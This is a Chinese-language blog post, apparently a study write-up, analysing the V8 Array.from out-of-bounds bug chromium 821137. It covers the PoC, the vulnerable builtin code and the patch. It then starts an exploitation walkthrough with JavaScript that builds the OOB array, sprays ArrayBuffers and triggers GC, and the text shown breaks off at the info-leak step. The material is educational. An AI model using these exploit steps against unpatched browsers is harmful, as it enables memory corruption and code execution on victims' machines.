<!DOCTYPE html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="​    最近笔者分析了一个chrome v8引擎的漏洞chromium821137，虽然这是一个老的漏洞，但是从漏洞分析利用中我们还是可以学习到v8漏洞利用的一些基础知识，对于入门学习浏览器漏洞利用具有较高的研究价值。"><link rel="stylesheet" type="text/css" href="/css/normalize.css"><link rel="stylesheet" type="text/css" href="/css/highlight.css"><link rel="stylesheet" type="text/css" href="/css/noise.css"><title>chromium821137 | /home/5n1p3r0010</title><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><meta name="generator" content="Hexo 5.4.0"></head><body><article class="wrapper"><div class="post-main"><div class="nav"><nav class="container"><a class="sidebar-nav-item active" href="/">Home</a><a class="sidebar-nav-item" href="/archives">Archives</a></nav><div class="container post-meta"><div class="post-tags"><a class="post-tag-none-link" href="/tags/Browser/" rel="tag">Browser</a></div><div class="post-time">2020-03-14</div></div></div><div class="container post-header"><h1>chromium821137</h1></div><div class="container post-toc"><details class="toc"><summary class="toc-accordion">Table of Contents</summary><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%89%E5%8F%96%E4%BB%A3%E7%A0%81"><span class="toc-number">1.1.</span> <span class="toc-text">拉取代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">调试环境搭建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞环境搭建</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#v8%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E5%BD%A2%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">v8数据存储形式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E4%BD%93%E6%80%9D%E8%B7%AF"><span class="toc-number">4.1.</span> <span class="toc-text">总体思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">4.2.</span> <span class="toc-text">任意地址写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E5%8F%AF%E6%8E%A7JSArrayBuffer"><span class="toc-number">4.3.</span> <span class="toc-text">获得可控JSArrayBuffer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">4.4.</span> <span class="toc-text">信息泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8wasm%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="toc-number">4.5.</span> <span class="toc-text">利用wasm执行任意代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="toc-number">5.</span> <span class="toc-text">完整exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">7.</span> <span class="toc-text">参考链接</span></a></li></ol></details></div><div class="container post-content"><p>​    最近笔者分析了一个chrome v8引擎的漏洞chromium821137，虽然这是一个老的漏洞，但是从漏洞分析利用中我们还是可以学习到v8漏洞利用的一些基础知识，对于入门学习浏览器漏洞利用具有较高的研究价值。</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="拉取代码"><a href="#拉取代码" class="headerlink" title="拉取代码"></a>拉取代码</h4><p>​    因为众所周知的原因，拉取v8代码需要使用非常规的方法，具体的搭建过程可以参考文末的链接。环境搭建和拉取旧的commit过程中我遇到的主要的坑是代理的问题，需要使用sock5全局代理，并且在使用谷歌的gclient sync命令的时候需要在根目录写一个.boto的配置文件才能使之运行时使用配置的代理；另外一个很重要的点是linux要使用ubuntu的镜像（笔者使用的是ubuntu 18.04），使用其他发行版可能会遇到奇奇怪怪意想不到的问题。大家在配置的过程如果遇到问题可以查找是不是上述步骤出现问题。</p>
<h4 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h4><p>​    v8调试环境可以使用v8安装目录下的/tools/gdbinit并将它加入根目录下.gdbinit配置里，修改.gdbinit配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit ~&#x2F;.gdbinit</span><br></pre></td></tr></table></figure>

<p>添加配置（可以配合其他gdb插件如pwndbg使用），</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source path&#x2F;to&#x2F;gdbinit</span><br></pre></td></tr></table></figure>

<p>使用gdb调试时可以先加载要调试的d8文件，然后设置启动参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set args --allow-natives-syntax xxx.js</span><br></pre></td></tr></table></figure>

<p>其中xxx.js可以在要调试的地方设置输出点和断点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(obj)    &#x2F;&#x2F; 输出对象地址</span><br><span class="line">%SystemBreak()      &#x2F;&#x2F; 触发调试中断</span><br></pre></td></tr></table></figure>

<p>在gdb中使用job addr命令可以很清晰的看到addr处的数据结构。</p>
<h4 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h4><p>​    我们从漏洞的issue链接<a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/chromium/issues/detail?id=821137%E6%89%BE%E5%88%B0%E4%BF%AE%E5%A4%8D%E7%9A%84commit%E9%93%BE%E6%8E%A5https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E3%80%81%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%8A%E4%B8%80%E4%B8%AA%E7%89%88%E6%9C%AC%EF%BC%88parent%EF%BC%89%E3%80%81diff%E4%BF%AE%E5%A4%8D%E4%BF%A1%E6%81%AF%E5%92%8C%E6%BC%8F%E6%B4%9Epoc%EF%BC%88%5Btest/mjsunit/regress/regress-821137.js%5D(https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d/test/mjsunit/regress/regress-821137.js)%EF%BC%89">https://bugs.chromium.org/p/chromium/issues/detail?id=821137找到修复的commit链接https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d，可以看到漏洞信息、存在漏洞的上一个版本（parent）、diff修复信息和漏洞poc（[test/mjsunit/regress/regress-821137.js](https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d/test/mjsunit/regress/regress-821137.js)）</a></p>
<p><img src="image-20200306212831902.png" alt="image-20200306212831902"></p>
<p>回退到漏洞存在的commit，分别编译debug和release版。（其中ninja构建系统是非google系的，需要自行安装，可以参考v8环境搭建的链接）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599</span><br><span class="line">gclient sync -f</span><br><span class="line">tools&#x2F;dev&#x2F;v8gen.py x64.debug </span><br><span class="line">ninja -C out.gn&#x2F;x64.debug d8</span><br><span class="line"></span><br><span class="line">tools&#x2F;dev&#x2F;v8gen.py x64.release</span><br><span class="line">ninja -C out.gn&#x2F;x64.release d8</span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>​    我们从poc出发来分析漏洞的原理，poc如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">let oobArray &#x3D; [];</span><br><span class="line">let maxSize &#x3D; 1028 * 8;</span><br><span class="line">Array.from.call(function() &#123; return oobArray &#125;, &#123;[Symbol.iterator] : _ &#x3D;&gt; (</span><br><span class="line">  &#123;</span><br><span class="line">    counter : 0,</span><br><span class="line">    next() &#123;</span><br><span class="line">      let result &#x3D; this.counter++;</span><br><span class="line">      if (this.counter &gt; maxSize) &#123;</span><br><span class="line">        oobArray.length &#x3D; 0;</span><br><span class="line">        return &#123;done: true&#125;;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        return &#123;value: result, done: false&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">) &#125;);</span><br><span class="line">oobArray[oobArray.length - 1] &#x3D; 0x41414141;</span><br></pre></td></tr></table></figure>

<p>poc主要是定义了一个数组和一个smi（small int）值，然后调用了一个方法Array.from.call，最后给定义的数组偏移[长度-1]的位置赋值时v8崩溃了。</p>
<p>​    poc中Array.from.call这个方法需要关注下，Array是一个js数据类型，from是Array类型的一个方法，Array.from整体相当于一个function，这个function又调用了call方法，这是js的一种调用方式Function.prototype.call()，语法是function.call(thisArg, arg1, arg2, …)。通过搜索MDN了解到Function.prototype.call()可以使用一个指定的this值和单独给出的一个或多个参数来调用一个函数即Function，而且参数可以是一个参数列表。</p>
<p>​    凭经验我们可以猜到应该是Array.from方法出现了问题，我们在/v8/src/目录下查找问题代码。（PS:v8的js函数实现方法一般在src目录下，搜索命令中r表示递归查找，R表示查找包含子目录的所有文件，n表示显示出现的行数）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r00t@5n1p3r0010:~$ grep -rRn &quot;array\.from&quot; -r &#x2F;home&#x2F;r00t&#x2F;v8&#x2F;src&#x2F;</span><br><span class="line">&#x2F;home&#x2F;r00t&#x2F;v8&#x2F;src&#x2F;builtins&#x2F;builtins-definitions.h:245:  &#x2F;* ES6 #sec-array.from *&#x2F;                                                    \</span><br><span class="line">&#x2F;home&#x2F;r00t&#x2F;v8&#x2F;src&#x2F;builtins&#x2F;builtins-array-gen.cc:1996:&#x2F;&#x2F; ES #sec-array.from</span><br></pre></td></tr></table></figure>

<p>找到Array.from方法实现的位置和行数/home/r00t/v8/src/builtins/builtins-array-gen.cc:1996:// ES #sec-array.from并跟进。</p>
<p>​    v8中js原生函数的实现是用c++写的，为了在各种cpu架构下做到性能优化的极致，google把这些重载过的c++代码实现的js原型函数用汇编器CodeStubAssembler生成了汇编代码。重载过的c++代码根据函数名字能大致猜到函数的功能（分析这个漏洞我们可以暂时不把主要精力放在分析这些重载的方法上，当然你要是像lokihardt那样“看一眼函数名字就知道哪有漏洞”当我没说;b），其中一些常用的重载方法如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">label	定义和bind绑定的标签</span><br><span class="line">bind	绑定声明的label和代码块，bind绑定的代码块并不以&#123;&#125;作为分割，绑定的是两个bind或者bind到当前函数结束之间的代码</span><br><span class="line">goto	跳转到代码块执行</span><br><span class="line">branch	相当于if的三目运算，即if(flag)? a;b，根据条件flag是否成立跳转到指定的label代码块a或b</span><br></pre></td></tr></table></figure>

<p>​    我们来分析一下v8的array.from实现，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler) &#123;</span><br><span class="line">  TNode&lt;Context&gt; context &#x3D; CAST(Parameter(BuiltinDescriptor::kContext));</span><br><span class="line">  TNode&lt;Int32T&gt; argc &#x3D;</span><br><span class="line">      UncheckedCast&lt;Int32T&gt;(Parameter(BuiltinDescriptor::kArgumentsCount));</span><br><span class="line"></span><br><span class="line">  CodeStubArguments args(this, ChangeInt32ToIntPtr(argc));</span><br><span class="line"></span><br><span class="line">  TNode&lt;Object&gt; map_function &#x3D; args.GetOptionalArgumentValue(1);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; If map_function is not undefined, then ensure it&#39;s callable else throw.</span><br><span class="line">  &#x2F;&#x2F;判断arg[1]即mapFn类型是否为undefined、smi、callable，否则报错</span><br><span class="line">  &#123;</span><br><span class="line">    Label no_error(this), error(this);</span><br><span class="line">    GotoIf(IsUndefined(map_function), &amp;no_error);</span><br><span class="line">    GotoIf(TaggedIsSmi(map_function), &amp;error);</span><br><span class="line">    Branch(IsCallable(map_function), &amp;no_error, &amp;error);</span><br><span class="line"></span><br><span class="line">    BIND(&amp;error);</span><br><span class="line">    ThrowTypeError(context, MessageTemplate::kCalledNonCallable, map_function);</span><br><span class="line"></span><br><span class="line">    BIND(&amp;no_error);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>首先判断了arg[1]的类型，我们通过查找MDN得知array.from的函数原型是Array.from(arrayLike[, mapFn[, thisArg]])，所以这里的arg[1]对应mapFn，同理GetOptionalArgumentValue()得到的其他参数对应方式类似。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;判断[symbol.iterator]方法是否定义</span><br><span class="line">IteratorBuiltinsAssembler iterator_assembler(state());</span><br><span class="line">Node* iterator_method &#x3D;</span><br><span class="line">    iterator_assembler.GetIteratorMethod(context, array_like);</span><br><span class="line">Branch(IsNullOrUndefined(iterator_method), &amp;not_iterable, &amp;iterable);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;使用自定义的[symbol.iterator]方法</span><br><span class="line">BIND(&amp;iterable);</span><br><span class="line">&#123;</span><br><span class="line">  TVARIABLE(Number, index, SmiConstant(0));&#x2F;&#x2F;定义Number类型变量index，值为0</span><br><span class="line">  TVARIABLE(Object, var_exception);</span><br><span class="line">  Label loop(this, &amp;index), loop_done(this),</span><br><span class="line">      on_exception(this, Label::kDeferred),</span><br><span class="line">      index_overflow(this, Label::kDeferred);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Check that the method is callable.</span><br><span class="line">  &#x2F;&#x2F;判断自定义的[symbol.iterator]方法是否是callable类型</span><br><span class="line">  &#123;</span><br><span class="line">    Label get_method_not_callable(this, Label::kDeferred), next(this);</span><br><span class="line">    GotoIf(TaggedIsSmi(iterator_method), &amp;get_method_not_callable);</span><br><span class="line">    GotoIfNot(IsCallable(iterator_method), &amp;get_method_not_callable);</span><br><span class="line">    Goto(&amp;next);</span><br><span class="line"></span><br><span class="line">    BIND(&amp;get_method_not_callable);</span><br><span class="line">    ThrowTypeError(context, MessageTemplate::kCalledNonCallable,</span><br><span class="line">                   iterator_method);</span><br><span class="line"></span><br><span class="line">    BIND(&amp;next);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  &#x2F;&#x2F; Construct the output array with empty length.</span><br><span class="line">  &#x2F;&#x2F;创建length为empty的数组</span><br><span class="line">  array &#x3D; ConstructArrayLike(context, args.GetReceiver());</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Actually get the iterator and throw if the iterator method does not yield</span><br><span class="line">  &#x2F;&#x2F; one.</span><br><span class="line">  IteratorRecord iterator_record &#x3D;</span><br><span class="line">      iterator_assembler.GetIterator(context, items, iterator_method);</span><br><span class="line"></span><br><span class="line">  TNode&lt;Context&gt; native_context &#x3D; LoadNativeContext(context);</span><br><span class="line">  TNode&lt;Object&gt; fast_iterator_result_map &#x3D;</span><br><span class="line">      LoadContextElement(native_context, Context::ITERATOR_RESULT_MAP_INDEX);</span><br><span class="line"></span><br><span class="line">  Goto(&amp;loop);</span><br></pre></td></tr></table></figure>

<p>然后判断array.from的第一个参数是否定义了迭代器方法iterator，若iterator方法非undefined、null使用自定义的迭代器方法，poc中的数组oobArray定义了iterator，会执行BIND(&amp;iterable)中的代码。这里需要关注的一点是在执行自定义的iterator时使用了变量index去记录迭代的次数。在判断完iterator方法是否是callable类型后poc中的代码会执行BIND(&amp;next)处的代码，在next中首先创建了一个长度为0的数组，然后跳转到loop处继续执行。</p>
<p>​    BIND(&amp;loop)主要是调用CallJS执行了自定义的Array.from(arrayLike[, mapFn[, thisArg]])中的mapFn方法，返回值存储在thisArg中，并用index记录迭代的次数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    ......</span><br><span class="line">    BIND(&amp;loop_done);</span><br><span class="line">    &#123;</span><br><span class="line">      length &#x3D; index;</span><br><span class="line">      Goto(&amp;finished);</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">      BIND(&amp;finished);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Finally set the length on the output and return it.</span><br><span class="line">  GenerateSetLength(context, array.value(), length.value());</span><br><span class="line">  args.PopAndReturn(array.value());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    iterator执行完成之后会跳转到loop_done处，index的value赋值给length，继续跳转到finished处。在finished处调用了GenerateSetLength设置生成的array的长度，注意这里的第三个参数length.value()实际上是自定义的iterator执行的次数。</p>
<p>​    继续跟进GenerateSetLength</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">BranchIfFastJSArray(array, context, &amp;fast, &amp;runtime);</span><br><span class="line"></span><br><span class="line">BIND(&amp;fast);</span><br><span class="line">&#123;</span><br><span class="line">  TNode&lt;JSArray&gt; fast_array &#x3D; CAST(array);</span><br><span class="line"></span><br><span class="line">  TNode&lt;Smi&gt; length_smi &#x3D; CAST(length);</span><br><span class="line">  TNode&lt;Smi&gt; old_length &#x3D; LoadFastJSArrayLength(fast_array);</span><br><span class="line">  CSA_ASSERT(this, TaggedIsPositiveSmi(old_length));</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 2) Ensure that the length is writable.</span><br><span class="line">  &#x2F;&#x2F; TODO(delphick): This check may be redundant due to the</span><br><span class="line">  &#x2F;&#x2F; BranchIfFastJSArray above.</span><br><span class="line">  EnsureArrayLengthWritable(LoadMap(fast_array), &amp;runtime);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 3) If the created array already has a length greater than required,</span><br><span class="line">  &#x2F;&#x2F;    then use the runtime to set the property as that will insert holes</span><br><span class="line">  &#x2F;&#x2F;    into the excess elements and&#x2F;or shrink the backing store.</span><br><span class="line">  GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);</span><br><span class="line"></span><br><span class="line">  StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,</span><br><span class="line">                                 length_smi);</span><br><span class="line"></span><br><span class="line">  Goto(&amp;done);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在GenerateSetLength中首先判断了array是否包含fast elements(具体快元素和字典元素的区别可以查阅参考链接)。poc中oobarray不包含configurable为false的元素是快元素，执行BIND(&amp;fast)的代码。在fast中把GenerateSetLength的第三个参数length转化赋值给length_smi，array的length转化赋值给old_length，然后比较length_smi和old_length的大小，若length_smi小于old_length则进行内存缩减跳转到runtime设置array的length为length_smi。</p>
<p>​    代码的逻辑看起来似乎没问题，就是对Array.from(arrayLike[, mapFn[, thisArg]])方法中的arrayLike对象执行自定义的迭代方法index次，创建一个空的array并在执行自定义迭代方法时设置它的长度为index.value，并最后检查根据index.value是否小于array的实际长度来决定设置array的长度为index.value或实际长度。但开发者似乎忽略了一个问题就是迭代方法是我们自己定义的，我们可以在迭代方法中设置Array.from(arrayLike[, mapFn[, thisArg]])中arrayLike对象的实际长度；如poc中我们在最后一轮迭代时设置oobArray的实际长度为0，在执行完maxSize次迭代后调用GenerateSetLength，这时oobArray迭代次数index&gt;设置的实际长度0，并不会跳转到runtime设置oobArray的长度为我们设置的实际长度0，这样我们在实际长度为0的oobArray里拥有迭代次数index大小长度的访问权，就造成了越界访问。</p>
<p>​    patch中修改SmiLessThan为SmiNotEqual，这样在迭代次数&gt;迭代函数中设置的实际长度时也会跳转到runtime执行设置数组的长度为迭代函数中设置的实际长度，就避免了oob的发生。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-      &#x2F;&#x2F; 3) If the created array already has a length greater than required,</span><br><span class="line">+      &#x2F;&#x2F; 3) If the created array&#39;s length does not match the required length,</span><br><span class="line">       &#x2F;&#x2F;    then use the runtime to set the property as that will insert holes</span><br><span class="line">-      &#x2F;&#x2F;    into the excess elements and&#x2F;or shrink the backing store.</span><br><span class="line">-      GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);</span><br><span class="line">+      &#x2F;&#x2F;    into excess elements or shrink the backing store as appropriate.</span><br><span class="line">+      GotoIf(SmiNotEqual(length_smi, old_length), &amp;runtime);</span><br></pre></td></tr></table></figure>

<h3 id="v8数据存储形式"><a href="#v8数据存储形式" class="headerlink" title="v8数据存储形式"></a>v8数据存储形式</h3><p>​    在js中number都是double型的，v8为了节约存储内存和加快性能，实现的时候加了smi（small int）型。32位系统中smi的范围是31位有符号数，64位smi范围是32位带符号数。大于2^32 v8会用float存储整型。</p>
<p>​    为了加快垃圾回收的效率需要区分number和指针，v8的做法是使用低位为标志位对它们进行区分。由于32位、64位系统的指针会字节对齐，指针的最低位一定为0，v8利用这一点最低位为1视为指针，最低位为0视为number，smi在32位系统中只有高31位是有效数据位。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h4><p>​    通过前面的分析我们得知这是一个越界访问漏洞，如果我们想通过这个越界访问漏洞达到任意代码执行的效果，容易想到的一种方式是通过越界访问达到任意地址写，再到劫持控制流进而任意代码执行。</p>
<h4 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h4><p>​    v8中达到任意地址读写的方法一般是控制一个JSArrayBuffer对象，之后的分析我们会看到JSArrayBuffer对象有一个成员域backing_store，backing_store指向初始化JSArrayBuffer时用户申请大小的堆，如果我们控制了一个JSArrayBuffer相当于一个指针和指针的内容可以同时改写。这样我们改写backing_store读取控制的JSArrayBuffer的内容就是任意地址读；我们改写backing_store修改控制的JSArrayBuffer的内容就是任意地址写。</p>
<h4 id="获得可控JSArrayBuffer"><a href="#获得可控JSArrayBuffer" class="headerlink" title="获得可控JSArrayBuffer"></a>获得可控JSArrayBuffer</h4><p>​    接下来的问题是如何得到可控的JSArrayBuffer对象，因为我们最后的目的是使得JSArrayBuffer的backing_store指针和指针的内容可写，所以这里需要JSArrayBuffer落到一个释放的oobArray里，这一步可以通过gc实现。触发gc可以通过删除对象引用实现，需要注意的一点是为了避免oobArray被gc完全回收，在最后一轮迭代后要设置oobArray.length为大于0的数如1。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*generate a Out-Of-Bound array and generate many ArrayBuffers and objects*&#x2F;</span><br><span class="line">var bufArray &#x3D; [];</span><br><span class="line">var objArray &#x3D; [];</span><br><span class="line">var oobArray &#x3D; [1.1];</span><br><span class="line">var maxSize &#x3D; 8224;</span><br><span class="line">function objGen(tag)&#123;</span><br><span class="line">    this.leak &#x3D; 0x1234;</span><br><span class="line">    this.tag &#x3D; tag;</span><br><span class="line">&#125;</span><br><span class="line">Array.from.call(function() &#123; return oobArray &#125;, &#123;[Symbol.iterator] : x &#x3D;&gt; (</span><br><span class="line">    &#123;</span><br><span class="line">        counter : 0,</span><br><span class="line">        next() &#123;</span><br><span class="line">        let result &#x3D; 1.1;</span><br><span class="line">        this.counter++;</span><br><span class="line">        if (this.counter &gt; maxSize) &#123;</span><br><span class="line">            oobArray.length &#x3D; 1;</span><br><span class="line">            bufArray.push(new ArrayBuffer(0xbeef));</span><br><span class="line">            objArray.push(new objGen(0xdead));</span><br><span class="line">            return &#123;done: true&#125;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return &#123;value: result, done: false&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">) &#125;);</span><br><span class="line"></span><br><span class="line">for(let x&#x3D;0; x&lt;&#x3D;maxSize; x++) &#123;let y &#x3D; oobArray[x]&#125;; &#x2F;&#x2F;trigger the GC</span><br></pre></td></tr></table></figure>

<h4 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h4><p>​    gc触发之后某个JSArrayBuffer会落在某个oobArray里，下一步就是确定JSArrayBuffer对象和用于泄露信息的objGen的位置。这里可以通过搜索自定义的标志位0xbeef和0xdead实现，</p>
